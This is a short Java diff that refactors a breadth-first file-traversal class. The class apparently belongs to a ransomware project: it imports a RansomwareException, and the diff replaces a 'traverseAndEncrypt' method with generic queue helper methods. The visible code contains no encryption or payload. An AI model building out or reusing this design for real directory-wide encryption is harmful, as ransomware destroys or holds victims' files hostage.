@@ -5,14 +5,27 @@ import java.util.Collection;
 import java.util.LinkedList;
 import java.util.Queue;
 
-public class BFS extends TraverseUtil {
+import server.exceptions.RansomwareException;
 
-	
+public class BFS extends Traverse {
+	private Queue<File> _queue;
+
 	@Override
-	public void traverseAndEncrypt(String inputDir, Collection<File> dirs) {
-		Queue<File> queue=new LinkedList<File>();
-		sharedCode(inputDir, dirs,queue);
-	
+	public void addToStruct(File file) {
+		_queue.add(file);
+
+	}
+
+	@Override
+	public File removeFromStruct() {
+
+		return _queue.poll();
+	}
+
+	@Override
+	public boolean checkEmptyStruct() {
+
+		return _queue.isEmpty();
 	}
 
 }
